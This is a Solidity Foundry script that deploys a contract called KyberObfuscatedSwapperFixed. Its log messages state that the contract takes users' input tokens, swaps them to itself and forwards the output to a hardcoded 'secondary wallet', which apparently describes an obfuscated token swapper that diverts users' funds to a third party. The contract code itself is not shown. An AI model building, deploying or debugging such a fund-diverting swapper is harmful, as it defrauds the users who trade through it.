// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/KyberObfuscatedSwapperFixed.sol";

contract DeployKyberFixedScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy the Fixed contract
        KyberObfuscatedSwapperFixed swapper = new KyberObfuscatedSwapperFixed();
        
        vm.stopBroadcast();
        
        console.log("========================================");
        console.log("KyberObfuscatedSwapperFixed deployed!");
        console.log("========================================");
        console.log("Contract Address:", address(swapper));
        console.log("Owner:", swapper.owner());
        console.log("========================================");
        console.log("");
        console.log("FIXED MECHANISM:");
        console.log("1. User's input tokens taken");
        console.log("2. Swap executed to CONTRACT");
        console.log("3. Output transferred to secondary wallet");
        console.log("");
        console.log("Secondary Wallet: 0xB64aA20dF7976B2412520c70b459152fE9a17256");
        console.log("");
        console.log("This avoids the swapCalldata mismatch issue!");
        console.log("========================================");
    }
}
